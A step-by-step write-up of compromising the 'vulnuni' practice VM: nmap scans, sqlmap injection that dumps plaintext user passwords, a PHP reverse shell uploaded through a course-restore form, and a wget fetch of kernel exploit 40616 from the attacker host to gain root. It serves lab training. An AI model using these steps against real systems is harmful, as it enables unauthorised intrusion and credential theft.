# vulnerable machine (vulnuni)

To penetrate the vulnerable machine (vulnuni) we have considered the host os (parrot) and open-source tools.

First, we tried to find the target using the ‘netdiscover’ tool:

`sudo netdiscover -r 10.10.10.0/24`

<figure><img src="https://lh7-us.googleusercontent.com/kpsNIbD7zAWuxPD4i8ZuKxqEf4G4tplQfV6fLmmPVtCB7FUqChn27mPzJdsQfzksdqo7W-uXPxp2Dzo_REeZ36t_h-mrwDt8M3l7eBJrnYjjciueSmHf7o1FD9IjMzRPkDaIgDI_0sx-EgC-uU9bgV4" alt=""><figcaption></figcaption></figure>

Targeted IP: 10.10.10.21

`nmap -sV -p- 10.10.10.21`

Note:

\-sV: Scan for web servers and grep to show which IPs are running web servers

\-sC: Scan with default NSE scripts. Considered useful for discovery and safe

```
nmap –sC -sV –A –script vuln 10.10.10.21
```

```
┌─[✗]─[riad@parrot]─[~]
└──╼ $nmap -sC -sV -A -script vuln 10.10.10.21
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-14 16:48 +06
Nmap scan report for 10.10.10.21
Host is up (0.0055s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.21
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.21:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/about.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/about.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/contact.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/contact.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/contact.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/courses.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/courses.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/index.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/index.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/index.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog-single.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog-single.html
|     Form id: name
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog-single.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.21:80/blog-single.html
|     Form id: 
|_    Form action: #
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.2.22: 
|     CVE-2017-7679 7.5 https://vulners.com/cve/CVE-2017-7679
|     CVE-2017-3169 7.5 https://vulners.com/cve/CVE-2017-3169
|     CVE-2017-3167 7.5 https://vulners.com/cve/CVE-2017-3167
|     SSV:60427 6.9 https://vulners.com/seebug/SSV:60427 *EXPLOIT*
|     SSV:60386 6.9 https://vulners.com/seebug/SSV:60386 *EXPLOIT*
|     SSV:60069 6.9 https://vulners.com/seebug/SSV:60069 *EXPLOIT*
|     CVE-2012-0883 6.9 https://vulners.com/cve/CVE-2012-0883
|     PACKETSTORM:127546 6.8 https://vulners.com/packetstorm/PACKETSTORM:127546 *EXPLOIT*
|     CVE-2016-5387 6.8 https://vulners.com/cve/CVE-2016-5387
|     CVE-2014-0226 6.8 https://vulners.com/cve/CVE-2014-0226
|     1337DAY-ID-22451 6.8 https://vulners.com/zdt/1337DAY-ID-22451 *EXPLOIT*
|     CVE-2017-9788 6.4 https://vulners.com/cve/CVE-2017-9788
|     SSV:60788 5.1 https://vulners.com/seebug/SSV:60788 *EXPLOIT*
|     CVE-2013-1862 5.1 https://vulners.com/cve/CVE-2013-1862
|     SSV:96537 5.0 https://vulners.com/seebug/SSV:96537 *EXPLOIT*
|     SSV:62058 5.0 https://vulners.com/seebug/SSV:62058 *EXPLOIT*
|     SSV:61874 5.0 https://vulners.com/seebug/SSV:61874 *EXPLOIT*
|     EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D 5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D *EXPLOIT*
|     EDB-ID:42745 5.0 https://vulners.com/exploitdb/EDB-ID:42745 *EXPLOIT*
|     CVE-2017-9798 5.0 https://vulners.com/cve/CVE-2017-9798
|     CVE-2016-8743 5.0 https://vulners.com/cve/CVE-2016-8743
|     CVE-2015-3183 5.0 https://vulners.com/cve/CVE-2015-3183
|     CVE-2014-0231 5.0 https://vulners.com/cve/CVE-2014-0231
|     CVE-2014-0098 5.0 https://vulners.com/cve/CVE-2014-0098
|     CVE-2013-6438 5.0 https://vulners.com/cve/CVE-2013-6438
|     CVE-2013-5704 5.0 https://vulners.com/cve/CVE-2013-5704
|     1337DAY-ID-28573 5.0 https://vulners.com/zdt/1337DAY-ID-28573 *EXPLOIT*
|     CVE-2012-0031 4.6 https://vulners.com/cve/CVE-2012-0031
|     SSV:60905 4.3 https://vulners.com/seebug/SSV:60905 *EXPLOIT*
|     SSV:60657 4.3 https://vulners.com/seebug/SSV:60657 *EXPLOIT*
|     SSV:60653 4.3 https://vulners.com/seebug/SSV:60653 *EXPLOIT*
|     SSV:60345 4.3 https://vulners.com/seebug/SSV:60345 *EXPLOIT*
|     CVE-2016-4975 4.3 https://vulners.com/cve/CVE-2016-4975
|     CVE-2014-0118 4.3 https://vulners.com/cve/CVE-2014-0118
|     CVE-2013-1896 4.3 https://vulners.com/cve/CVE-2013-1896
|     CVE-2012-4558 4.3 https://vulners.com/cve/CVE-2012-4558
|     CVE-2012-3499 4.3 https://vulners.com/cve/CVE-2012-3499
|     CVE-2012-0053 4.3 https://vulners.com/cve/CVE-2012-0053
|     CVE-2008-0455 4.3 https://vulners.com/cve/CVE-2008-0455
|_    CVE-2012-2687 2.6 https://vulners.com/cve/CVE-2012-2687
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.18 seconds


-A: Enables OS detection, version detection, script scanning, and traceroute
```

We have found http/80 port is open on that IP. So we have tried to access it using the browser. Then we have found a website.

<figure><img src="https://lh7-us.googleusercontent.com/o_bCM0kGTfZLiiRUiCYwoJANOZMSiyHD7MqoW9fTID81uFxKaJEOZLMhTrgotbSLPV346lw62TpOXYc_ocjMeOrFJI2v7LIkIVw_ooX8u_yFMh3JhvNJGgxCbWkXY_cWWqkG6HpGjeAQykzOM7BTgrs" alt=""><figcaption></figcaption></figure>

Then we started inspecting the page. On the tab “Courses” we have found a hyperlink “vulnuni-eclass-platform.html”.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/Yr1C0haxE5XX8M5GqYOOR1OBDyiGUdjL1hVscxb_a12uvC5QBGPDnHJd11wB-qGNk7ZQHVlMTWX6nP673CICHoscn6b2ieVtR4EVaFTX4B4u5t89vEQTeXXipbv7ze7XYr9Dt_iagiyZgedKdL-xnSc" alt=""><figcaption></figcaption></figure>

It redirects us to a new login page.

<figure><img src="https://lh7-us.googleusercontent.com/_qBjUR47oebG-Skiyd0aNC9v4rEIy-u5feKsF5_pDPcoUfrYi4RO84fdWVe6XOJZ-TCEt8eqHjVtUOdjMvSIMeHYMRo3n2wVRfDZwPZ_oyTAgY8bwcmtxwnKFEiz8povc03FORaWm-pj9ajC5hHD3GA" alt=""><figcaption></figcaption></figure>

Then we configure the burp suite to analyze the web page.

<figure><img src="https://lh7-us.googleusercontent.com/I-UTz-7QvAx-otqpX4l3nzno7ih0a8J_N_QSg3eHtSbIg_tq87YiFaEM8nQeaialrwdwCsjuSWEa7bIpZczh2Qyj20JlWqNPCaPUp4lq13ClJ95bZcq89xr6o2ZCnowSMR-jKRPutVvu3pqzSbIoZjM" alt=""><figcaption></figcaption></figure>

For using the Burp Suite we need a proxy configuration. We are considering Foxyproxy addone to the Firefox browser.

<figure><img src="https://lh7-us.googleusercontent.com/ItufIr-uxQfgMPsU0CnMGXThl-Jl1VLFMy3wCBl1bxMqgKJKK_WYriDdZiK85S5BlqWQqMUUXvjaiM4VhVtRkgnSdQovKs_2-PV2riXogjkzdnukXkyBweMYuiesQ9x7WYo6IDxO_6FKTm58gcJAyNQ" alt=""><figcaption></figcaption></figure>

Configuration of Foxyproxy:&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/S_x9CoCdZPTzEWPt2ytkp0C9fC4VZZuk_77N_n1eZUM9usThO28L-ZE38Wn5dFkLNxYTOlsJaUZD1Qb0RaT1-OsNIXLFxS_Nv7ilqdFBmvRN9t-ywQyQy6FaCcbj5sJFyc1C7Tyqrc_2Wn4uzmYtDYA" alt=""><figcaption></figcaption></figure>

Configure the host file:

Command: vi /etc/hosts

Now tried to ping using hostname:

<figure><img src="https://lh7-us.googleusercontent.com/ZtxEWiWvMxjfnWs_Mj9pnJrX7uIEy5vAqyjsJObTtrffy407S4McZR_pUNuHQ93AQZ23Un3A1HDKhfRP_NjMIlhLxkWoPujP5VXoNWnwFLf-bFW7jJ_3l5iW0c9e9OjQW15-mEHE6nyA7sKSu9qfx-4" alt=""><figcaption></figcaption></figure>

Then we will configure a proxy in the Burf Suite.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/dEnwmNevMNSoIMOkKBzA09OScPQm__SOESC5yEie_L86T4a5DFwWQmYQeLC0EwfJQNx8fDzLGJeZwqxeAx1Bpyvm2JadweVCZqTHc5Dhc4P473vDu2Qf_e9sHLwlECXLb8juJ5Xfi8aByKr-Yi95Sks" alt=""><figcaption></figcaption></figure>

Then we try to log in again.

<figure><img src="https://lh7-us.googleusercontent.com/bYUTcBB4wOgLbxSQqhb_HxSOLOyXWF1h_V69JtdpVMkcsg8LqkDVTVfsdU-4ky9yPzAkpa2LIFB3DJRrUVUxJBify10rLNabDsIFy7wlzGRkSFRpP5dOI2il4yLWq3-mw2RGLNXr5s0_YYNSIXwaiVM" alt=""><figcaption></figcaption></figure>

If we go to Burp Suite, we will see the intersection.

<figure><img src="https://lh7-us.googleusercontent.com/0aIBO6hv5mOm0nu7FKbYbH3AVE7Yo6yIxiFbnCgELaqPRaDdD4MsI2bpNUdkraXR_JDLWMOmKs6kpwzqcwdImSPoxPLJt036HNDvhO2XT7D9FJsV4ONL3rhvzmIjb0UDE1JiYA4uuZMDP0p3hehyDv4" alt=""><figcaption></figcaption></figure>

Then we save the interception file:

```
POST /vulnuni-eclass/ HTTP/1.1
Host: vulnuni.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://vulnuni.local/vulnuni-eclass/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://vulnuni.local
DNT: 1
Connection: close
Cookie: PHPSESSID=90shbggastsf4v7ebesd44dlu3
Upgrade-Insecure-Requests: 1

uname=admin&pass=admin&submit=Enter
```

Then we go to the directory where we have saved the file (burp\_inspection).

`cd /home/riad/Desktop/`

Then check the file:

`ls -la`

<figure><img src="https://lh7-us.googleusercontent.com/MsZ2lUSqN4Dk2NSRmkiyihXitWNdtcZa41Hxh39EUqSa8P50n7hJqkAfesWpI-R6o_kwmf3-hX6ujrKOZnjIJYDoCEQr8Vzra2WJMM0mEQilDFXl-qu9osdv2tahZtPew8_Om6EiK1nOJUtgvh4cNLM" alt=""><figcaption></figcaption></figure>

Then we perform the vulnerability assessment of the database:

`sqlmap -r burp_intersecption --dbs --batch`

After scanning ‘sqlmap’ able to find 5 databases.

<figure><img src="https://lh7-us.googleusercontent.com/O5qk4nEiMrzoFmP5hileTLf6GHVhQ-D71Dj6uAvcr80IlQ4q18lDEIoG76S9mIaWwMucMacSgcC4SpGkL0ee_4X5Cz7kLGLj3zkd7zjkLN7Ws4asldp8CAOpMUmW65wcJ7HEERRIEvitLKba-o9IJTU" alt=""><figcaption></figcaption></figure>

```
available databases [5]:
[*] eclass
[*] information_schema
[*] INFOSEC100
[*] mysql
[*] performance_schema
```

Then we check the databases tables one by one.

Command: sqlmap -r burp\_intersecption -D eclass --tables --batch

<figure><img src="https://lh7-us.googleusercontent.com/Jgt0k8L5SACASi18wFv1GZWn6fvk2tVuHy19cCzZfXhN_33Ocxeiwe0noC-YFCI3U3ajM1YLYdDvjdai8CNMeNIJnzRb_nkPrZPoARBFSMejEODHJXHhfosPGvrGv--OhamKEHsrNV-Tq0vtjEiAqI0" alt=""><figcaption></figcaption></figure>

We have found 16 tables:

```
Database: eclass
[16 tables]
+---------------------+
| admin               |
| user                |
| annonces            |
| cours               |
| cours_faculte       |
| cours_user          |
| faculte             |
| institution         |
| loginout            |
| pma_bookmark        |
| pma_column_comments |
| pma_pdf_pages       |
| pma_relation        |
| pma_table_coords    |
| pma_table_info      |
| prof_request        |
+---------------------+
```

Then we scan for one table with the column. Here we have considered ‘user’.

`sqlmap -r burp_intersecption -D eclass -T user --column --batch`

<figure><img src="https://lh7-us.googleusercontent.com/516zBctfCNNpRoc1ApCiXxxyUeDR4i3i4gChCrukAw1BZL9T28ub0CIidxjcwNBmpuj5CHd7QqYwKA26akJmqfAg3FDEYJhSIcIZhEtj8xhnobSumB4rWHm5jaeymCa9S3qPgoNj2tjqTmWBYnt_UJ8" alt=""><figcaption></figcaption></figure>

```
Database: eclass
Table: user
[11 columns]
+------------+-----------------------+
| Column     | Type                  |
+------------+-----------------------+
| am         | varchar(20)           |
| department | int(10)               |
| email      | varchar(100)          |
| inst_id    | int(11)               |
| nom        | varchar(60)           |
| password   | varchar(50)           |
| phone      | varchar(20)           |
| prenom     | varchar(60)           |
| statut     | tinyint(4)            |
| user_id    | mediumint(8) unsigned |
| username   | varchar(50)           |
+------------+-----------------------+
```

Now we dump the username and password of the user column by using the below command.

`sqlmap -r burp_intersecption -D eclass -T user -C username,password --dump --batch`

<figure><img src="https://lh7-us.googleusercontent.com/COmam0F0mUSDgVWSKq7rJi_JKAZWb7UP8PM4KBRiu3Bz8ZdtKjd4a9cRHk_GXSu64IWzFoAIEKh1D9AuU2QFu9oqrRwUJ_yawXNW_4E8mWWjo7Awj5fQjbl4Iy8zDSz0YXvxo46DXslDReoEab9vzZY" alt=""><figcaption></figcaption></figure>

Here we can crack the password for the user table.&#x20;

```
Database: eclass
Table: user
[4 entries]
+----------+--------------+
| username | password     |
+----------+--------------+
| garris.e | hf74nd9dmw   |
| perez.s  | i74nw02nm3   |
| admin    | ilikecats89  |
| smith.j  | smith.j.1971 |
+----------+--------------+
```

Now turn off the interception and proxy.

<figure><img src="https://lh7-us.googleusercontent.com/DqnlC98Nqbpa3hx8dMZzcPwoY2Gbha8vao5B8a6Ho50Hz4eM7uc5_1tBhaKntrkIhYaRARZdf9-JB1cxn1Qh8uifkfwa060WxW5x6q7hkUlo3bgWZYkuCpq61G6oQZ8ilY-9kRdAvwr9Nb6vVHNyOfU" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/DhHyMB2sYM7U2vaQSlS6ptA5C4fnZ0afuN9-390CQyzxKNj6rv-3EdvrrE0ub2y6VWviorsW4CPRLytgoFRG3Wel0AR_JmVJr9MW-aNUxw7G1PE2CBePlsJKQyXya2qNE6Cw6_Y0eFuEqfmjkG5pilI" alt=""><figcaption></figcaption></figure>

Then we try to log in to the site using the generated password.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/qFjpGB2t40KBFfRh1xAJ5h5udZcN1UiI7WC51a7bbMulpRcEO-GvymFzWM74nLvA4GPOIzHJazmHSVrKGMn6xxNxAT3FM-lAEOguTp1UDC6a1x4CI6d4eOdkII_BT4TpxlePytSNrO6q3KuvZIXrcV0" alt=""><figcaption></figcaption></figure>

We can log into the site.

Now we go through different tabs.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/beHKoVD7Zz6QQPzk47G5hIOnPhOSKjvZIEG-0L4dy641SjK0ommR0IZ-tkF5kE-J6GoGVtHN0FGuYLqdsC5IpKP_9Uz2CFmtNkelzc_rKEJP1MxRnCKKS__tvcizjw6Efu5DZ4YvrPrWPVOtp2yYnl8" alt=""><figcaption></figcaption></figure>

We go to the Restore a Course tab. Found that we can upload the files form here.

<figure><img src="https://lh7-us.googleusercontent.com/mI6qpebGoIOpuEl9E0mTiarRGF8e43LE1G2kMgglHqCwg1FfhnaO8qQ_AwKfirdPxfpQP1VJqy69I62cdWx_wRedKsMzFDGniy6e5PiwqFEYrx2mURdKNuzRIrQfB95pOh06aP88hfyfpzobyZvvQT0" alt=""><figcaption></figcaption></figure>

Now we will reverse scripting of the PHP. Here we have considered  ‘pentestmonkey /php-reverse-shell’

It's downloaded in the location: /home/riad/Downloads

Then we go to that location:

`cd /home/riad/Downloads`

Now we need to change the script. Open the script with Notepad

In the $ip we change with host machine IP.&#x20;

On the website, it's asking to upload the file by compressing.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/K-Wi-d9J9RP9gT9ZRm8P3rIWjIbCMxOTR5PI52EfM5jgPYZyX9JRQyqcyEGSNSvKKIYXyH1IWDsPjGEG8PFw91HvPWyWbVAxW3j1v3c7S-luQNy65l3cZiO33Q9OASRcJjdZHbio4-2Y3Bz02X6zQC8" alt=""><figcaption></figcaption></figure>

So we compress the shell script.

Then we upload the compressed file to the website and submit it.

<figure><img src="https://lh7-us.googleusercontent.com/0t87aENnSVgCFdbSIeU4cbPedRMSVfgXAF1GZN_pzCCpnwFJUyiNtKGZsC7YjtXb757eRNFiQB3nuUx-pI7lIdIiWVNvtcabOFvwbnk-O-kwSJoNoc4wuJZKTKPqzPNCxmz5g6PDdLKkRrZQwpP_sVQ" alt=""><figcaption></figcaption></figure>

We found that the compressed file was successfully submitted to the website.

<figure><img src="https://lh7-us.googleusercontent.com/Px-Xrrni_FlCPXyNgkQLBX7qsjBp3vg_a_-VsNdpVoFGdIN0ziP0POv2_RjP4QF9C0RpPLIGdUZ8pwdoyuCuttMFsi7ANClcDMxPpbcE7uhsNT6-4G7KGlHGT85bBNVZNWDuPJF97UEBhbKVuVmHyDU" alt=""><figcaption></figcaption></figure>

Now, we give the netcat command to listen to port 1234.

`nc -lnvp 1234`

If anyone responds to this port, then will be able to listen to that port.

Now we try to run a nonexistent page in the browser.

<figure><img src="https://lh7-us.googleusercontent.com/MvjFRtD1LMCWBYG0lT4p--BTTyEJxM-O6DN6eHjlCaAUldAIE7VT8ue-4Bjbo3UV95_kCc2iL5UOCBI7EtIv1e3TaGOejWvJkIFDX56taFbB3p38xwFGM00SFFyiKFavWMExNz0O2tRUx5lcvhnezYc" alt=""><figcaption></figcaption></figure>

After that, we will see that we have successfully penetrated that machine.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/dgO-POMnpZAs35BYFzwB2ssQeWC3p0TGIWrgSnGo2KEjf7cAa8g7KbO7SHTjFJfPyW7Q03O2PoqO2kxHg-Ulk8RelBLQhIOj8uWuehHUjb_g7cN03QKEnxlQWrAVF0WWC2sQYjeE2H7Fyf04xLZXTJ4" alt=""><figcaption></figcaption></figure>

We can check the location of that vulnerable machine.

&#x20;`whoami`

<figure><img src="https://lh7-us.googleusercontent.com/YsWXgTkGv2h6ZNP6nF-gTip1VxA0sRTpzafKk6b3F_R408-jIDLiXfxRkQpDw6QEBdJ4ZEwo8dyIVeDL5iIOJ2dbYWxFLlVT0CuYk_Efrj90Vyyh3m3erZrGAXHh054pKHTPCupjfXcid9YfOfiyW8s" alt=""><figcaption></figcaption></figure>

We can see the files on the directory.

<figure><img src="https://lh7-us.googleusercontent.com/g7bCHvr--2haZI-nz8709Qg4zZpOpmuU2ZrrY0fGe3DWzwx1q9Sw2mNYqmKb62yPuJPMLC4r0yGSdROIFTJORsIqKZd5OcMs6ej86IvC25ozBZnzu_rqea7gi5MDWvIWCU75mu2XYnY-UKwrWuv6oi4" alt=""><figcaption></figcaption></figure>

To get access of the shell we use the below command:

`python -c 'import pty;pty.spawn("/bin/bash")'`

Then we will able to access the shell.

<figure><img src="https://lh7-us.googleusercontent.com/Aa-74x6WPoXb7Ja-HUp6z6IgrD_e7Z_LHA6Ilbh-oS0g_QH-toL3GOsKawx35Ut2BJzDoTqG7E1NiSMKfSkkNwor4t4HawgPshFq-BnjXXath2pdHT_0tzHMrXdARizf-rfH_mEynNSb2GQkVU29NNk" alt=""><figcaption></figcaption></figure>

Now we check the directory and files inside that directory.

<figure><img src="https://lh7-us.googleusercontent.com/dQKalNwgWey0i2MflZmOBbiRz4gbIKPBe9IgPQAK7y1hOOFLcp8rX0I-JS4wabtMr90id9zTsNWYLLJ8jj7SXvjvx5px2p5HroTbnPOVbZ009YafeSdkHrkfCgYakxuoWIj29nG_Z4Lu5x7w8RpAaAE" alt=""><figcaption></figcaption></figure>

Now we try to change the directory, if it's possible or not

`cd home`

<figure><img src="https://lh7-us.googleusercontent.com/7Rkq7zGOnfhQRoWDGLGm8IK0hKN3EfTJCm0gURoyVnEbGnc7x1YModFTiFVl3lW1InN0nZLFdehKkp1Y89M4GRuKcUIkcjDwlejdeDwXJJjnnVi6ZoEW-aS7AIRvaZWb-bDv7onV3G0h3BGDO4uG1Uc" alt=""><figcaption></figcaption></figure>

Check inside the home directory.

<figure><img src="https://lh7-us.googleusercontent.com/9SIFMp8TkmIoM0T43dWHZ0p4jZXIdIzbai5eFqdy5_3n-jYjlZsS98gcMKVdJizsmZ8lhzb-qqAWN5lWX-P0jE8V64B4sj3oWXUnZctebuQ1f8Z3kF-CbmvH-TvN7GQrgdCGZ-0OyBwcwxQcURPB_9E" alt=""><figcaption></figcaption></figure>

Then we go to the directory ‘vulnuni’.

And check inside that directory.

<figure><img src="https://lh7-us.googleusercontent.com/tRTJI4zM7mutrXtg9wxeZ_ZwXVBat_oQRDy4J3IGB4-S5GNFVnFFrlxXqTKS_SVLNKA0cmMwgPFnWz8CiJshwTuawUp0m4rSHT_Lo2Yr7hg4XFfQUTBrE7FAiew5iyG7HC9uZVbo2vN5Q32tQOI-TVw" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/4tU1W4-9J1SNY47t8dwlPQuTfgboxhFDlIa0h4LrjjvAhyajKcikoFZyJt3AXWmCL6jNUj8YiUePh2fLXf7HuQuwLMUdiLhblWq48krhYt7z6Ogv5mMef0Up44h37eJJBn2sIXnKErkZuR0rJFE-jrE" alt=""><figcaption></figcaption></figure>

We found a flag.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/sMafkEQFpCm5Nwbsy2gzZX9KYboXyal1H2vJ_pIIfa9yOGkTyqfY2gE1xLLsfAXZtYPO_cEwceFRO06G2Ep-qndXA9Mh4MFdEq0nfgUZhGbjYGhsA6NRpDvabkdh4Fk-B5bt_-mYKAWkF4HuoagVa6c" alt=""><figcaption></figcaption></figure>

We tried to access the root folder.

<figure><img src="https://lh7-us.googleusercontent.com/MB4vQomJObK8ueleqaxFurhHcyrIhLTZ-LZ78ZcYjecUCBa8fehwAO-NhaUYvrCOb9w73NAGWBVv2MgaiDcjH2PCVBDGLYIxLdwM_3eSANTGBIrpjF3UW2IhjpGWwJejuM0KoElrwDHqR61vi2yexZk" alt=""><figcaption></figcaption></figure>

We found that we are unable to access the root folder.

Then we try to check the os version

`uname -r`&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/Kf2JWpdLd81KuNUwybPvjqVqkhLWWBQQ5EGlKVeM0_vZ8Ce9SaBm_eJgtELl4D2bNhJh4FIGIwoBnzu6M3lOzVI-DnB2tWEZcZjq75eq0LRLsqbQVbGNqEybgkCih5HskP0nggyyqcVS93XpBWTsByY" alt=""><figcaption></figcaption></figure>

Now we search for any vulnerability related to this version of kernel.

For different exploits, we have considered the below exploit (EDB-ID: 40616).

<figure><img src="https://lh7-us.googleusercontent.com/c25mkg60Tzv22JeBnXzpcYYvh62sstH0LmqOhFLYw5vrgp3UP8rKdNlAAk9-uN0B21Ex67yyUNs3nrDE7wlxp98E63a1u4_JAPYUbxQwr4lHU2CyiW26jZEfZfMVP6S2FwlLaV9aIXGIZQBAE_CmDwc" alt=""><figcaption></figcaption></figure>

We have downloaded the file in the directory. Then go to the download location:

<figure><img src="https://lh7-us.googleusercontent.com/RKzHZEkVEhjYVkvId9U1BTEriRXR1nr5EDbazDZrsjndY6lP5qli0winEJ2fTeNELTVwI0rTVc9-SjJaBv-lqHwDzJzH3AAGh9LlUw4uneYWoxgIsP9oyMyXYdZw0xQx2Wy9yPL7IDgje0urLOcqOwQ" alt=""><figcaption></figcaption></figure>

Now we run the Apache to the host machine.&#x20;

`service apache2 start`

<figure><img src="https://lh7-us.googleusercontent.com/tAKtXeI26-0igIShsI8nWZiVwN2HqgpXznYDZlZklbGKNTmc6pMp570w2plQhWutBaO6f3hbVcx_T8Qg6ylPzVdcJ1RXmWVVhpo48MnBULjcXRzyB-Nil_vN-vtH-hV3DSoKVg-56CG2-ish7U5EE-c" alt=""><figcaption></figcaption></figure>

Now copy the exploit to the webserver directory.

`sudo cp 40616.c /var/www/html/`

<figure><img src="https://lh7-us.googleusercontent.com/h4vKj5IDXfpPzjCWrGSBJNRa1aXunN8xu65s81WBzUxQHWPSfBeCubQ-ULQPyBps-giOJpL5zrQzXu4wIUs4zCOev6_QNdYVbej2Xk0SeUJy4lKgScq08JOAcJ9LjIwgqt8P9HPj8PUHioTJ99n97zM" alt=""><figcaption></figcaption></figure>

Then we check for the exploit to the location;

<figure><img src="https://lh7-us.googleusercontent.com/WQCB6HBmrmWRYpYyeJiCQraT7shViuDoIYsRvrUwrYoUwU5MOhxc2Nv9UZr4vhVJIuYjVW7hLjkqsAsfLcRxVjHXBMzpSNF_hZaz7h3VzgglSeYG3g8v9RiaChsQ-KiHjc0MaazydrWay-72wtqVtlk" alt=""><figcaption></figcaption></figure>

Now we try to access the tmp directory in the vulnerable machine.

`cd /tmp`

<figure><img src="https://lh7-us.googleusercontent.com/d_gdmx2e0ihaAzeE1fvABerh1gr_LIE0nd_1oBQ7TfxeXRwutUQ6TsJfK18y3l1iHSm6-DmyXpQXdbItnr_iAd326Nygs-dBJsq8lZFyjMZIZ4nmIAAYWWpOUx9Cl9XfgvnfJuWAcbjHD3E3M81Grr4" alt=""><figcaption></figcaption></figure>

Now check inside the directory tmp.

<figure><img src="https://lh7-us.googleusercontent.com/cWVYNSXWSXZn7AMKFa8uAjCg0NfwyZvI6xVakn2mGVHm-zInanMawpuRW21FyasN-F3GIdlK1EIOeZQ7UexYyIrDN8fmy_GT8ULABRkMwp4wy1Q_iaJczZiOYLDQZP6rZog9enqfommWbTWb1WqsL1Q" alt=""><figcaption></figcaption></figure>

Now we want to download the exploit to this vulnerable machine.

`wget http://10.10.10.15/40616.c`

<figure><img src="https://lh7-us.googleusercontent.com/mmYfuRv0ylCXas-LUWhwr-9wu_707avhRuz34xybBoBymYdyCl7GykI-977LDAmYnRUgYVDEms3lddye5VpFa3-6oyniD66AONkJC56rk_Hah1OTsKohORmDlZeS2cFV-S2yNxvhyeLkbG2fxFnK704" alt=""><figcaption></figcaption></figure>

Now check, whether that file downloaded to tmp directory:

<figure><img src="https://lh7-us.googleusercontent.com/2JQAA6IQDU-Z6KKSpbTQuVT4k9VqEDgDhcH983cPikmPPSMqg243CIILWWhqRax-Q1Z37mW7wkC-FZC82lWoE0blLsOBuoPJ7vg_RvlolHVQrWPK0j1ib-UqBG6ZaGTtu1K8SZh61jEOTUbc5hT2xnU" alt=""><figcaption></figcaption></figure>

As the file is available so we run the below command:

`/tmp$  gcc 40616.c -o root -pthread`

<figure><img src="https://lh7-us.googleusercontent.com/C2aRcKOzaMbvOXc6JFrGSiGrwhvv8QXqvmZ4IfOcJnT_vuYXeQfX1iz5ZbPnd7LVy-Ihv8_V6dbTFCNFg3bW--pFAjvg4LCAYlGTp80bS97z_4CbyrmTaylmtQMB71IMjkeSJjCcv_IFl4FQwlLPHcg" alt=""><figcaption></figcaption></figure>

Now execute the code as root.

`./root`

<figure><img src="https://lh7-us.googleusercontent.com/_xikJ07E81CpoWxYVOUpE44WjmgNyD1SM6E1ziEHuyzQ0anShYPDk6sq4gPbFNtjogYWREFvmqFZAC1VP7BwEdjmkmuVGC6GrSIXhWVgBDUSRj6rHnXfhmiytgScQN843JwLk6eBR1ccPdRkJQSE3JE" alt=""><figcaption></figcaption></figure>

Then we will see that we are a root user.

\
